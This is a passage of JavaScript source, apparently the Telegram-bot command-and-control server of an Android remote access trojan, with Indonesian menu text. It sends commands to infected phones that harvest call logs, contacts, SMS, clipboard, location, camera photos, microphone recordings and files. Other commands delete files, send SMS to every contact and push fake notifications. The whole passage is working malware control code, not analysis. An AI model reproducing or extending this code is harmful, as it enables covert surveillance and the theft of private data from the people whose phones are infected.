                        {text: '𝙝𝙞𝙙𝙪𝙥𝙠𝙖𝙣 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙈𝙖𝙩𝙞𝙠𝙖𝙣 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙠𝙞𝙧𝙞𝙢 𝙥𝙚𝙨𝙖𝙣 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝘼𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
            '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴇʀɪᴍᴀ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ʙᴇʙᴇʀᴀᴘᴀ 𝙨ᴀᴀᴛ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙈𝙚𝙣𝙪 𝙁𝙞𝙩𝙪𝙧"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙩𝙤𝙡𝙤𝙣𝙜 𝙗𝙖𝙡𝙖𝙨 𝙙𝙚𝙣𝙜𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙠𝙚 𝙢𝙖𝙣𝙖 𝙖𝙣𝙙𝙖 𝙞𝙣𝙜𝙞𝙣 𝙢𝙚𝙣𝙜𝙞𝙧𝙞𝙢 𝙨𝙢𝙨\n\n' +
            '•Jika Anda ingin mengirim SMS ke nomor lokal, Anda bisa memasukkan nomornya dengan nol di awal, jika tidak, masukkan nomornya dengan kode negara ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙠𝙞𝙧𝙞𝙢𝙠𝙖𝙣 𝙠𝙚𝙥𝙖𝙙𝙖 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠\n\n' +
            '• Harap berhati-hati pesan tidak akan dikirim jika jumlah karakter dalam pesan Anda melebihi batas yang diizinkan ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• Anda tidak perlu memasukkan jalur file lengkap, cukup masukkan jalur utama. misalnya, masukkan<b> DCIM/Camera </b> Untuk menghapus file galeri .',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• Anda tidak perlu memasukkan jalur file lengkap, cukup masukkan jalur utama. misalnya, masukkan<b> DCIM/Camera </b> Untuk menghapus file galeri .',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙚𝙠𝙨 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙩𝙚𝙧𝙟𝙚𝙢𝙖𝙝𝙠𝙖𝙣\n\n' +
            '• Harap dicatat bahwa Anda harus memasukkan waktu secara numerik dalam satuan detik ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙩𝙚𝙧𝙖𝙥𝙠𝙖𝙣 𝙥𝙖𝙙𝙖 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩\n\n' +
            '• Toas adalah pesan singkat yang muncul di layar perangkat selama beberapa detik ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙩𝙚𝙧𝙖𝙥𝙠𝙖𝙣 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞\n\n' +
            '• Pesan Anda akan muncul di status bar perangkat target seperti notifikasi biasa ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙢𝙖𝙞𝙣𝙠𝙖𝙣\n\n' +
            '• Perhatikan bahwa Anda harus memasukkan tautan langsung dari suara yang diinginkan, jika tidak suara tidak akan diputar. ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
